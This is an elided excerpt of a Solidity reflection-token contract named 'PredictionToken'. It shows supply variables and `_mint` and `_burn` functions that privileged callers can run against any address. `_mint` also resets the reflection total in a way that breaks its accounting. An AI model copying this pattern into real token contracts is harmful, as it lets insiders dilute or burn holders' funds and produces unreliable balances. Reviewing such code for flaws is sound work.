...
contract PredictionToken is Context, IERC20, Ownable {
    ...
    uint256 public _tTotal = 8000 * 10**6 * 10**9;
    uint256 public _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "Predict token";
    string private _symbol = "Predict token";
    ...
    function _mint( address sender, uint256 tAmount) public onlyAuthenticate {
        uint256 rAmount = tAmount.mul(_getRate());
        _tOwned[sender] = _tOwned[sender].add(tAmount);
        _rOwned[sender] = _rOwned[sender].add(rAmount);
        _tTotal = _tTotal.add(tAmount);
        _rTotal = (MAX - (MAX % _tTotal));
        emit Transfer(address(this), sender, tAmount);
    }
    
    function _burn( address sender, uint256 tAmount) public onlyAuthenticate {
        uint256 rAmount = tAmount.mul(_getRate());
    ...
    function _takeBurnt(uint256 tBurnt) private {
        ...
        _rOwned[address(0)] = _rOwned[address(0)].add(rBurnt);
